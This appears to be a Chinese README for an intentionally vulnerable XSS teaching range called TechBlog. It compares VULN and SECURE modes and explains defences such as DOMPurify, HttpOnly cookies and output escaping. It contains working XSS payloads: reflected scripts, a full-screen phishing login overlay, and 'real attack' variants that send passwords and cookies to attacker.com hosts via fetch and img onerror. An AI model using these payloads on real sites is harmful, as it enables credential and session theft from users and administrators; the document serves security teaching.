# TechBlog - XSS 演示场景说明（精简版）

## 模式说明

### 快速切换（推荐）

1. **点击页面左上角徽章**：
   - VULN 模式：红色徽章
   - SECURE 模式：绿色徽章

2. **确认切换**：
   - 已登录：系统会提示并自动退出登录
   - 未登录：直接切换生效

3. **重新登录**：切换后重新登录即可使用新模式

**优点**：
- ✅ 无需重启服务
- ✅ 适合演示中快速切换对比
- ✅ 可在未登录状态下预先设置模式

### 两种模式差异

| 项目 | VULN 模式 | SECURE 模式 |
|------|----------|----------|
| **JWT 存储** | localStorage | HttpOnly Cookie |
| **前端渲染** | `v-html` 直接渲染 | DOMPurify 过滤 |
| **后端输出** | 直接拼接（不转义） | HtmlUtils.htmlEscape |
| **XSS 执行** | ✅ 可成功执行 | ❌ 被完全拦截 |
| **L0 场景** | 弹窗出现 | 显示转义文本 |
| **L1 场景** | 窃取 JWT | 无 Token（null） |
| **L2 场景** | 伪装登录框 | 只显示文本 |
| **L3 场景** | 脚本执行 | 被过滤 |

### 注意事项

- 演示请先切到 **VULN 模式**，SECURE 模式用于对比防御效果
- 切换后需要 **重新登录**，以保证 JWT 存储策略生效
- 每次切换后建议 **清理浏览器缓存**，避免旧状态干扰

---

## L0：反射型 XSS（PoC）

- 目标：验证 XSS 存在，执行简单 JS
- 入口：`/search?q=...`
- 步骤：访问 `http://localhost:5173/search?q=<script>alert('XSS')</script>`
- 预期：
  - VULN：弹窗出现
  - SECURE：页面显示已转义的文本，不弹窗
- 代码：
  - 前端渲染：apps/frontend/src/pages/Search.vue:20（条件 `v-html` / 文本渲染）
  - 后端转义（示例意图）：SearchController 返回字符串在 SECURE 模式进行转义

---

## L1：反射型 XSS + JWT 窃取

- 目标：通过 XSS 读取 localStorage 的 JWT
- 前置：先用 alice 登录
- 步骤：访问 `http://localhost:5173/search?q=<script>console.log(localStorage.getItem('accessToken'))</script>`
- 预期：
  - VULN：Console 打印出 JWT
  - SECURE：localStorage 无 token（HttpOnly Cookie），打印 null
- 代码：
  - 存储策略：apps/frontend/src/stores/auth.js:14（VULN 存 localStorage）
  - 请求策略：apps/frontend/src/api/axios.js:7（VULN 读 localStorage；SECURE 走 withCredentials）

---

## L2：存储型 XSS（伪装登录钓鱼）

- 目标：Bio 注入全屏伪装登录，诱骗输入账号密码
- 前置：使用 attacker 登录，编辑 Bio 注入恶意 HTML
- 触发：访问 `http://localhost:5173/profile/attacker`
- 预期：
  - VULN：伪装登录框覆盖页面，输入后弹窗显示“窃取成功”
  - SECURE：Bio 被 DOMPurify 过滤（无执行）
- 代码：
  - 前端渲染：apps/frontend/src/pages/Profile.vue:21（VULN 原样渲染；SECURE 调用 `pure`）

---

## L3：盲 XSS（管理员查看反馈）

- 目标：当管理员打开反馈详情时触发脚本（管理员不知情）
- 步骤：
  1) `/feedback` 提交含脚本内容
  2) 用 admin 登录，在 `/admin/feedbacks` 打开详情
- 预期：
  - VULN：详情内联内容触发脚本（可能读取 Cookie）
  - SECURE：DOMPurify 过滤后不执行
- 代码：
  - 渲染点：apps/frontend/src/pages/admin/FeedbackList.vue:71（VULN 直渲；SECURE `pure()`）

---

## 故障排查（精简）

- XSS 不生效：确认模式为 VULN；修改后已重启前后端；清理浏览器缓存
- L1 无 JWT：VULN 下应存在 `localStorage.accessToken`；SECURE 下应为 null
- L2 无伪装层：确认 attacker 的 Bio 已保存为恶意 HTML；查看控制台是否有 CSS 报错
- L3 不触发：确认反馈内容包含 `<script>` 或危险事件属性；管理员确实点开了详情

快速检查模式（浏览器 Console）：
```js
fetch('/api/config').then(r=>r.json()).then(d=>console.log('mode:', d.xssMode));
console.log('localStorage:', localStorage.getItem('accessToken'));
console.log('cookie:', document.cookie);
```

---

## 防御要点（对比）

- 输出编码（后端）：`HtmlUtils.htmlEscape()`
- 内容净化（前端）：`DOMPurify.sanitize()`（白名单策略）
- 凭证存储：HttpOnly + Secure + SameSite Cookie（不让 JS 读取）
- 可选：适配 CSP 策略（限制脚本来源）

示例（前端净化函数）：apps/frontend/src/utils/xss.js

---

## 教学建议（流程）

1) 先在 VULN 模式顺序演示 L0→L3，讲危害
2) 再切换 SECURE 模式重复操作，讲防御点
3) 总结 Cookie 安全、输出编码、DOMPurify 白名单、最小化信任

---

祝演示顺利！本靶场仅用于授权的教学与研究，请勿用于生产与非法用途。

### 🎬 演示步骤

**前置条件**：
- ✅ 项目已启动在 VULN 模式
- ✅ 数据库中已有 attacker 用户（预置数据）

**第一步：政击者注入恶意代码**

1. 使用 **attacker 账号**登录：
   - 用户名：`attacker`
   - 密码：`Attacker#2025`

2. 访问 attacker 的主页：`http://localhost:5173/profile/attacker`

3. 点击「**编辑简介**」按钮

4. 在 Bio 字段中输入以下代码：

```html
<style>html,body{overflow:hidden!important;margin:0!important;padding:0!important}#xss-backdrop{position:fixed;top:0;left:0;right:0;bottom:0;background:linear-gradient(180deg,#0B1220 0%,#0E1626 50%,#0B1220 100%);z-index:999998}#xss-header{position:fixed;top:0;left:0;right:0;height:64px;background:rgba(18,24,38,0.95);backdrop-filter:blur(10px);border-bottom:1px solid #1e293b;z-index:999999;display:flex;align-items:center;padding:0 24px}#xss-header .logo{display:flex;align-items:center;gap:10px;color:#e2e8f0;font-weight:700;font-size:20px}#xss-header .logo-icon{font-size:24px}#xss-header .badge{font-size:11px;padding:3px 10px;border-radius:12px;background:rgba(239,68,68,0.2);color:#FCA5A5;margin-left:8px}#xss-content{position:fixed;top:64px;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;padding:20px;z-index:999999}#xss-card{width:100%;max-width:460px;background:#121826;border:1px solid #1e293b;border-radius:14px;padding:32px;box-shadow:0 8px 32px rgba(0,0,0,0.6)}#xss-card h2{color:#22D3EE;margin:0 0 8px;text-align:center;font-size:24px;font-weight:700}#xss-card .subtitle{color:#94A3B8;margin:0 0 24px;text-align:center;font-size:14px}#xss-card .field{margin-bottom:16px}#xss-card .label{color:#94A3B8;margin-bottom:8px;font-size:13px;display:flex;gap:4px}#xss-card .req{color:#ef4444}#xss-card input{width:100%;padding:12px;background:#0b1220;border:1px solid #334155;color:#e2e8f0;border-radius:8px;font-size:14px;outline:none;box-sizing:border-box}#xss-card input:focus{border-color:#22d3ee;box-shadow:0 0 0 3px rgba(34,211,238,0.15)}#xss-card button{width:100%;padding:12px;background:linear-gradient(180deg,#60a5fa,#3b82f6);color:#0b1220;border:none;border-radius:8px;font-weight:700;font-size:14px;cursor:pointer}#xss-card .muted{margin-top:16px;text-align:center;font-size:13px;color:#94a3b8}#xss-card .muted a{color:#22d3ee;text-decoration:none}</style><div id="xss-backdrop"></div><div id="xss-header"><div class="logo"><span class="logo-icon">⚡</span><span>TechBlog</span><span class="badge">VULN</span></div></div><div id="xss-content"><form id="xss-card" onsubmit="event.preventDefault();alert('🚀 窃取成功!\n用户名: '+this.user.value+'\n密码: '+this.pass.value);return false"><h2>登录</h2><div class="subtitle">欢迎回到 TechBlog</div><div class="field"><div class="label"><span class="req">*</span><span>用户名</span></div><input name="user" placeholder="请输入用户名" required /></div><div class="field"><div class="label"><span class="req">*</span><span>密码</span></div><input name="pass" type="password" placeholder="请输入密码" required /></div><button type="submit">登录</button><div class="muted">还没有账号？<a href="#">立即注册</a></div></form></div>
```

**代码说明**:
- `#xss-backdrop` - 背景遮罩层，z-index:999998
- `#xss-header` - 仿造顶部导航栏，64px 高度，z-index:999999
- `#xss-content` - 表单容器，从 64px 开始到底部，z-index:999999
- `overflow:hidden!important` - 禁止页面滚动，防止抖动
- 所有元素使用 `#xss-` 前缀避免与页面元素冲突
- 使用项目的颜色方案保持视觉一致性
- `event.preventDefault()` - 阻止表单默认提交
- `alert()` - 演示窃取效果（真实攻击使用 `fetch()` 发送到远程服务器）

5. 点击「**保存**」

6. 关闭编辑对话框，页面刷新

**第二步：受害者访问攻击者主页（触发点）**

1. 退出登录（如果已登录）

2. 使用普通用户账号登录（或直接以游客身份）：
   - 用户名：`alice`
   - 密码：`Admin#2025`

3. 访问 attacker 的主页：`http://localhost:5173/profile/attacker`
   - 或者在首页点击 attacker 发布的文章，再点击作者名称

4. **💥 XSS 触发！**
   - 页面被全屏伪装登录框覆盖
   - UI 设计精美，高度仿真
   - 用户输入用户名和密码后点击“登录”
   - 弹窗显示窃取的凭证！

**第三步：真实攻击模拟（高级）**

在真实攻击中，攻击者会将数据发送到远程服务器：
```html
<style>html,body{overflow:hidden!important;margin:0!important;padding:0!important}#xss-backdrop{position:fixed;top:0;left:0;right:0;bottom:0;background:linear-gradient(180deg,#0B1220 0%,#0E1626 50%,#0B1220 100%);z-index:999998}#xss-header{position:fixed;top:0;left:0;right:0;height:64px;background:rgba(18,24,38,0.95);backdrop-filter:blur(10px);border-bottom:1px solid #1e293b;z-index:999999;display:flex;align-items:center;padding:0 24px}#xss-header .logo{display:flex;align-items:center;gap:10px;color:#e2e8f0;font-weight:700;font-size:20px}#xss-header .logo-icon{font-size:24px}#xss-header .badge{font-size:11px;padding:3px 10px;border-radius:12px;background:rgba(239,68,68,0.2);color:#FCA5A5;margin-left:8px}#xss-content{position:fixed;top:64px;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;padding:20px;z-index:999999}#xss-card{width:100%;max-width:460px;background:#121826;border:1px solid #1e293b;border-radius:14px;padding:32px;box-shadow:0 8px 32px rgba(0,0,0,0.6)}#xss-card h2{color:#22D3EE;margin:0 0 8px;text-align:center;font-size:24px;font-weight:700}#xss-card .subtitle{color:#94A3B8;margin:0 0 24px;text-align:center;font-size:14px}#xss-card .field{margin-bottom:16px}#xss-card .label{color:#94A3B8;margin-bottom:8px;font-size:13px;display:flex;gap:4px}#xss-card .req{color:#ef4444}#xss-card input{width:100%;padding:12px;background:#0b1220;border:1px solid #334155;color:#e2e8f0;border-radius:8px;font-size:14px;outline:none;box-sizing:border-box}#xss-card input:focus{border-color:#22d3ee;box-shadow:0 0 0 3px rgba(34,211,238,0.15)}#xss-card button{width:100%;padding:12px;background:linear-gradient(180deg,#60a5fa,#3b82f6);color:#0b1220;border:none;border-radius:8px;font-weight:700;font-size:14px;cursor:pointer}#xss-card .muted{margin-top:16px;text-align:center;font-size:13px;color:#94a3b8}#xss-card .muted a{color:#22d3ee;text-decoration:none}</style><div id="xss-backdrop"></div><div id="xss-header"><div class="logo"><span class="logo-icon">⚡</span><span>TechBlog</span><span class="badge">VULN</span></div></div><div id="xss-content"><form id="xss-card" onsubmit="event.preventDefault();fetch('https://attacker.example.com/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:this.user.value,pass:this.pass.value,cookie:document.cookie,url:location.href})});alert('登录失败，请重试');this.user.value='';this.pass.value='';return false"><h2>登录</h2><div class="subtitle">欢迎回到 TechBlog</div><div class="field"><div class="label"><span class="req">*</span><span>用户名</span></div><input name="user" placeholder="请输入用户名" required /></div><div class="field"><div class="label"><span class="req">*</span><span>密码</span></div><input name="pass" type="password" placeholder="请输入密码" required /></div><button type="submit">登录</button><div class="muted">还没有账号？<a href="#">立即注册</a></div></form></div>
```

**这样攻击者就能在远程服务器上收到：**
- 🔑 用户输入的用户名和密码
- 🍪 Cookie 信息（VULN 模式下可能包含 JWT）
- 🔗 当前 URL（确认攻击来源）

### ✅ 预期效果

**VULN 模式**：
- ✅ 页面被全屏伪装登录框覆盖
- ✅ UI 设计精美，高度仿真
- ✅ 输入的凭证被窃取
- ⚠️ 普通用户难以识别是钓鱼页面

**SECURE 模式**：
- ❌ Bio 中的 HTML/JavaScript 被 DOMPurify 过滤
- ✅ 只显示安全的文本内容
- ✅ 不出现伪装登录框

### 💻 代码位置

**前端渲染** ([src/pages/Profile.vue](../apps/frontend/src/pages/Profile.vue)):
```vue
<!-- VULN 模式：直接渲染 HTML，允许执行恶意代码 -->
<div v-if="configStore.xssMode === 'vuln'" 
     class="bio-content" 
     v-html="user.bio">
</div>

<!-- SECURE 模式：使用 DOMPurify 过滤 -->
<div v-else 
     class="bio-content" 
     v-html="pure(user.bio)">
</div>
```

### 🛡️ SECURE 模式防御

**DOMPurify 白名单过滤** ([src/utils/xss.js](../apps/frontend/src/utils/xss.js)):
```javascript
export const pure = (html) => {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'code'],
    ALLOWED_ATTR: { 'a': ['href', 'title'] },
    // 危险的 style、script、iframe 等全部被移除
  });
};
```

**防御效果**：  
✅ 移除所有 `<script>`、`<iframe>`、`<style>` 标签  
✅ 移除所有事件处理器（`onclick`、`onerror` 等）  
✅ 移除 `position:fixed` 等危险样式  
✅ 只允许安全的文本格式标签

---

## 📍 场景 L3：盲 XSS（管理后台反馈详情）

**难度**：⭐⭐⭐⭐ 高级  
**类型**：盲 XSS (Blind XSS) + 存储型 XSS  
**攻击目标**：窃取管理员凭证，攻击隐蔽性极高

### 💡 攻击原理

用户在前台提交反馈时注入恶意脚本，存储到数据库。当管理员在后台查看反馈详情时，恶意脚本被执行（**管理员看不到攻击发生**，故称「盲 XSS」）。

**与 L2 的区别**：  
- L2：攻击者和被攻击者看到同样的页面  
- L3：攻击者不知道攻击是否成功，只有管理员触发时才执行

### 🎬 演示步骤

**前置条件**：
- ✅ 项目已启动在 VULN 模式
- ✅ 有两个账号：普通用户 + admin 管理员

**第一步：攻击者提交恶意反馈（无需登录）**

1. 访问反馈页面：`http://localhost:5173/feedback`

2. 填写表单：
   - **邮箱**：`evil@hacker.com`
   - **反馈内容**（演示版）：
   ```html
   <script>
   alert('🚨 管理员您好！您已触发盲XSS攻击！\n\n攻击者可以窃取您的Cookie:\n' + document.cookie);
   </script>
   <p>这是一条正常的反馈内容（掩护）</p>
   ```

3. 点击「提交反馈」

4. 提交成功，恶意代码已存储到数据库

💡 **提示**：此时攻击者不知道攻击是否会成功，只能等待管理员查看。

**第二步：管理员查看反馈（触发点）**

1. 退出当前登录（如果已登录）

2. 使用**管理员账号**登录：
   - 用户名：`admin`
   - 密码：`Admin#2025`

3. 访问管理后台：`http://localhost:5173/admin/feedbacks`

4. 找到刚才提交的反馈（状态为「未读」）

5. 点击「**查看**」按钮

6. **💥 盲 XSS 触发！**
   - 弹窗显示管理员的 Cookie 信息
   - 在 VULN 模式下，这里可能包含 JWT Token

**第三步：真实攻击模拟（高级）**

在真实攻击中，攻击者会将数据发送到远程服务器：
```html
<img src=x onerror="fetch('https://attacker.com/log?cookie='+document.cookie+'&url='+location.href)">
<p>请尽快处理此反馈，非常紧急！</p>
```

这样攻击者就能在远程服务器上收到管理员的凭证。

### ✅ 预期效果

**VULN 模式**：
- ✅ 管理员点击查看后，弹窗显示 Cookie 信息
- ✅ 在 VULN 模式下，Cookie 可能包含 JWT（取决于模式）
- ⚠️ 管理员完全不知道攻击发生
- ⚠️ 攻击者获取管理员权限

**SECURE 模式**：
- ❌ 不弹窗
- ✅ DOMPurify 过滤掉 `<script>` 和 `<img>` 标签
- ✅ 只显示纯文本内容

### 💻 代码位置

**前端渲染** ([src/pages/admin/FeedbackList.vue](../apps/frontend/src/pages/admin/FeedbackList.vue)):
```vue
<!-- BLIND XSS L3 LANDING POINT -->
<!-- VULN 模式：直接渲染，允许执行恶意代码 -->
<div v-if="configStore.xssMode === 'vuln'" 
     class="content-html" 
     v-html="currentFeedback.contentHtml">
</div>

<!-- SECURE 模式：DOMPurify 过滤 -->
<div v-else 
     class="content-html" 
     v-html="pure(currentFeedback.contentHtml)">
</div>
```

**数据存储** ([backend/controller/FeedbackController.java](../apps/backend/src/main/java/com/techblog/backend/controller/FeedbackController.java)):
```java
@PostMapping("/feedback")
public ResponseEntity<?> submitFeedback(@RequestBody FeedbackRequest request) {
    // VULN 模式：直接存储用户输入，不做过滤
    feedback.setContentHtml(request.getContent());
    
    // SECURE 模式建议：在存储前进行 HTML 转义
    // String sanitized = HtmlUtils.htmlEscape(request.getContent());
    // feedback.setContentHtml(sanitized);
}
```

### 🛡️ SECURE 模式防御

**前端 DOMPurify 过滤**：
```javascript
// 后台渲染反馈内容前，使用 DOMPurify 净化
const pure = (html) => DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'code'],
  ALLOWED_ATTR: { 'a': ['href', 'title'] }
});
```

**后端增强防御**（可选）:
```java
// 在存储前就进行 HTML 转义
String sanitized = HtmlUtils.htmlEscape(request.getContent());
feedback.setContentHtml(sanitized);
```

**防御效果**：  
✅ 所有 `<script>` 标签被移除  
✅ `onerror` 等事件处理器被移除  
✅ 即使管理员查看，也不会触发攻击

---

## 📍 场景 L4：存储型 XSS（文章评论）

**难度**：⭐⭐⭐ 中级  
**类型**：存储型 XSS  
**攻击目标**：通过评论注入脚本，影响所有查看该文章的用户

### 💡 攻击原理

用户在文章详情页发表评论时注入恶意脚本，脚本被存储到数据库。之后所有访问该文章的用户（包括未登录用户）都会触发 XSS 攻击。

**与其他场景的区别**：  
- L0/L1：反射型，仅影响点击恶意链接的用户  
- L2：存储型，但仅在访问特定用户主页时触发  
- L3：盲 XSS，仅管理员可见  
- L4：存储型，**所有访客都会中招**

### 🎬 演示步骤

**前置条件**：
- ✅ 项目已启动在 VULN 模式
- ✅ 已有测试账号（如 alice）

**第一步：攻击者发表恶意评论（需要登录）**

1. 使用普通用户账号登录：
   - 用户名：`alice`
   - 密码：`Admin#2025`

2. 访问任意文章详情页（如文章 ID=1）：
   `http://localhost:5173/article/1`

3. 在评论输入框中输入恶意代码：
   ```html
   <img src=x onerror="alert('评论XSS攻击！\n文章：'+document.title+'\nCookie：'+document.cookie)">
   ```

4. 点击「发表评论」按钮

5. 评论提交成功，恶意代码已存储到数据库

**第二步：受害者访问文章（触发点）**

1. **无需登录**，直接访问该文章：
   `http://localhost:5173/article/1`

2. **💥 XSS 触发！**
   - 页面加载时立即弹窗
   - 显示文章标题和 Cookie 信息
   - 所有访问该文章的用户都会触发

**第三步：真实攻击模拟（高级）**

在真实攻击中，攻击者可能会：
```html
<img src=x onerror="fetch('https://attacker.com/steal',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:location.href,referrer:document.referrer})})" style="display:none">
<p>写得很好，学到了很多！</p>
```

这样每个访问该文章的用户的 Cookie 都会被发送到攻击者服务器。

### ✅ 预期效果

**VULN 模式**：
- ✅ 评论发表成功
- ✅ 页面刷新后，弹窗显示 Cookie 信息
- ✅ 其他用户（包括未登录用户）访问该文章也会触发
- ⚠️ 影响范围广，危害严重

**SECURE 模式**：
- ❌ 恶意代码被转义存储：`&lt;img src=x onerror=...&gt;`
- ✅ 前端渲染时再用 DOMPurify 二次过滤
- ✅ 页面只显示转义后的文本，不执行脚本
- ✅ 双重防御确保安全

### 💻 代码位置

**后端存储** ([ArticleService.java](../apps/backend/src/main/java/com/techblog/backend/service/ArticleService.java)):
```java
@Transactional
public CommentDto createComment(Long articleId, String username, CommentRequest request) {
    // ...
    String content = request.getContent();
    if (xssProperties.isSecure()) {
        // SECURE 模式：HTML 转义，防止 XSS
        comment.setContentHtml(HtmlUtils.htmlEscape(content));
    } else {
        // VULN 模式：直接存储（存在 XSS 漏洞）
        comment.setContentHtml(content);
    }
    // ...
}
```

**前端渲染** ([ArticleDetail.vue](../apps/frontend/src/pages/ArticleDetail.vue)):
```vue
<!-- XSS 渲染说明：
     - VULN：评论原样渲染（存储型 XSS 示例）
     - SECURE：渲染前先净化 -->
<div class="comment-content"
     v-if="configStore.xssMode === 'vuln'"
     v-html="comment.contentHtml"></div>
<div class="comment-content"
     v-else
     v-html="pure(comment.contentHtml)"></div>
```

**权限控制** ([SecurityConfig.java](../apps/backend/src/main/java/com/techblog/backend/security/SecurityConfig.java)):
```java
.authorizeHttpRequests(auth -> auth
    // 文章查询：公开访问
    .requestMatchers(HttpMethod.GET, "/api/articles/**").permitAll()
    // 评论提交：需要登录
    .requestMatchers(HttpMethod.POST, "/api/articles/*/comments").authenticated()
    // ...
)
```

### 🛡️ SECURE 模式防御

**后端双重防御**：
```java
// 1. 存储前转义（第一道防线）
String sanitized = HtmlUtils.htmlEscape(request.getContent());
comment.setContentHtml(sanitized);
// 存储结果：&lt;img src=x onerror=...&gt;
```

**前端 DOMPurify 过滤**（第二道防线）：
```javascript
const pure = (html) => DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'code'],
  ALLOWED_ATTR: { 'a': ['href', 'title'] }
});
```

**防御效果**：  
✅ 后端转义确保存储安全  
✅ 前端过滤确保渲染安全  
✅ 双重防御，即使一层失效也安全  
✅ 符合深度防御（Defense in Depth）原则

### 📊 影响范围对比

| 场景 | 影响范围 | 触发条件 | 隐蔽性 |
|------|----------|----------|--------|
| L0/L1 | 点击链接的用户 | 主动点击恶意链接 | 低 |
| L2 | 访问特定主页的用户 | 访问攻击者主页 | 中 |
| L3 | 管理员 | 查看反馈详情 | 高 |
| **L4** | **所有访问文章的用户** | **访问文章** | **中** |

**L4 的特点**：
- ⚠️ **影响范围最广**：所有访问该文章的用户
- ⚠️ **无需特定操作**：只要打开文章就中招
- ⚠️ **包括未登录用户**：查看评论不需要登录
- ⚠️ **持续时间长**：评论长期存在，持续攻击

---

## 🔧 故障排查

### 问题 1：XSS 攻击没有效果

**现象**：输入 `<script>alert('XSS')</script>` 后没有弹窗

**排查步骤**：

1. **检查模式配置**
   - 后端：`application.yml` 中 `xss.mode` 是否为 `vuln`
   - 前端：`.env` 中 `VITE_XSS_MODE` 是否为 `vuln`
   - 确认修改后**重启了服务**

2. **检查浏览器控制台**
   - 按 F12 打开开发者工具
   - 查看 Console 是否有错误信息
   - 查看 Network 请求是否成功

3. **检查模式是否生效**
   - 打开 Console，输入：`localStorage.getItem('accessToken')`
   - VULN 模式：应该返回 JWT token
   - SECURE 模式：应该返回 `null`

### 问题 2：登录后看不到 JWT

**现象**：L1 场景中 localStorage 为空

**解决方案**：

1. 确认前端在 VULN 模式：
   ```bash
   cat apps/frontend/.env
   # 应该显示：VITE_XSS_MODE=vuln
   ```

2. 确认重启了前端服务

3. 清除浏览器缓存，重新登录

### 问题 3：管理员无法访问后台

**现象**：访问 `/admin/feedbacks` 被重定向

**解决方案**：

1. 确认使用 admin 账号登录：`admin / Admin#2025`

2. 检查用户角色：
   - 打开 Console
   - 查看 localStorage 或 Cookie 中的 token
   - 解码 JWT（可使用 [jwt.io](https://jwt.io)）
   - 检查 payload 中的 role 是否为 "ADMIN"

### 问题 4：L2 伪装登录框没有显示

**现象**：访问 `/profile/attacker` 看不到伪装登录框

**排查步骤**：

1. **检查数据库**：
   ```sql
   SELECT username, LEFT(bio, 50) FROM users WHERE username='attacker';
   ```
   应该看到 Bio 中包含 `<div style="position:fixed...`

2. **检查模式**：
   - 确认 VULN 模式
   - 查看页面源代码，确认是否使用 `v-html`

3. **检查浏览器控制台**：
   - 查看是否有 CSS 错误
   - 查看是否有 z-index 被覆盖

### 问题 5：L3 盲 XSS 不触发

**现象**：管理员点击查看反馈，但没有弹窗

**排查步骤**：

1. **检查反馈内容**：
   ```sql
   SELECT id, email, LEFT(content_html, 100) FROM feedbacks ORDER BY created_at DESC LIMIT 5;
   ```
   确认反馈中包含 `<script>` 标签

2. **检查模式**：
   - 确认 VULN 模式
   - 在管理后台查看页面源代码

3. **检查浏览器设置**：
   - 某些浏览器可能默认阻止弹窗
   - 检查地址栏是否有弹窗阻止图标

### 问题 6：切换到 SECURE 模式后，XSS 仍然有效

**原因**：没有重启服务

**解决方案**：

1. 修改配置文件后，必须重启服务：
   ```bash
   # 后端
   cd apps/backend
   # Ctrl+C 终止，然后
   mvn spring-boot:run
   
   # 前端
   cd apps/frontend
   # Ctrl+C 终止，然后
   npm run dev
   ```

2. 清除浏览器缓存：
   - 按 Ctrl+Shift+Delete
   - 清除缓存和 Cookie
   - 刷新页面

### 快速验证模式

在浏览器 Console 中运行：

```javascript
// 检查前端模式
fetch('/api/config')
  .then(r => r.json())
  .then(d => console.log('🔧 当前模式:', d.xssMode));

// 检查 JWT 存储位置
console.log('🔑 localStorage:', localStorage.getItem('accessToken'));
console.log('🍪 Cookie:', document.cookie);
```

---

## 🎯 防御措施总结

## 🎯 防御措施总结

### 🛡️ 输入验证与输出编码

| 层面 | 方法 | 实现 |
|------|------|------|
| **后端** | HTML 转义 | `HtmlUtils.htmlEscape()` |
| **前端** | 白名单过滤 | `DOMPurify.sanitize()` |
| **数据库** | 存储前净化 | 可选增强 |

### 🍪 Cookie 安全

| 属性 | 作用 | 配置 |
|------|------|------|
| **HttpOnly** | 防止 JS 读取 | `cookie.setHttpOnly(true)` |
| **Secure** | 仅 HTTPS 传输 | `cookie.setSecure(true)` |
| **SameSite** | 防 CSRF | `cookie.setAttribute("SameSite", "Strict")` |

### 🛡️ Content Security Policy（可扩展）

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

### 📊 输入长度限制

- ✅ **前端**：Element Plus 表单验证
- ✅ **后端**：`@Size(max = 500)` 注解
- ✅ **数据库**：`VARCHAR(500)` 长度限制

---

## 🎓 教学建议

### 📖 演示流程

1. **第一阶段：VULN 模式演示**
   - 依次演示 L0 → L1 → L2 → L3
   - 讲解每个场景的原理和危害
   - 强调攻击者可以获取的权限

2. **第二阶段：SECURE 模式对比**
   - 切换到 SECURE 模式
   - 重复相同的攻击操作
   - 对比观察攻击失败

3. **第三阶段：防御措施讲解**
   - 讲解 DOMPurify 白名单机制
   - 讲解 HttpOnly Cookie 的重要性
   - 讲解后端输入验证

### 💡 教学重点

- **JWT 存储位置的安全性差异**
  - localStorage：可被 JS 读取，危险
  - HttpOnly Cookie：JS 不可访问，安全

- **DOMPurify 白名单机制**
  - 只允许安全的标签和属性
  - 移除所有事件处理器
  - 移除危险的样式属性

- **后端输入验证的重要性**
  - 前端验证可被绕过
  - 必须在后端也进行验证
  - 双重防御更安全

- **盲 XSS 的隐蔽性和危害**
  - 攻击者不知道攻击是否成功
  - 被攻击者（管理员）也不知道攻击发生
  - 需要更高的安全意识

### 📢 注意事项

1. **演示环境隔离**
   - 在内网或本地环境运行
   - 不要连接公网
   - 使用教学专用数据库

2. **强调安全意识**
   - 这是演示靶场，不是真实应用
   - 生产环境必须启用全部防御措施
   - 安全是持续过程，不是一次性工作

3. **鼓励动手实践**
   - 让学生自己注入测试
   - 尝试修改恶意代码
   - 分析防御机制的实现

---

## 🎯 总结

本靶场通过 **4 层渐进式场景**，全面演示了 XSS 攻击的危害和防御方法：

- ✅ **L0**：理解基础 XSS 原理
- ✅ **L1**：掌握凭证窃取技巧
- ✅ **L2**：学习存储型 XSS 和钓鱼攻击
- ✅ **L3**：理解盲 XSS 的隐蔽性

通过 **VULN / SECURE 双态模式对比**，直观展示了安全防御的效果。

**防御体系**：
- 🍪 **Cookie 安全**：HttpOnly + Secure + SameSite
- 🛡️ **输入验证**：后端 HTML 转义 + 前端 DOMPurify 过滤
- 🔒 **安全响应头**：CSP + X-Frame-Options + X-XSS-Protection
- ✅ **动态切换**：根据模式自动启用/禁用防御机制

**祝演示顺利！** 🎉

---

<div align="center">

**⚠️ 请始终记住：这是教学靶场，不是真实应用 ⚠️**

生产环境必须启用 SECURE 模式的所有防御措施

</div>
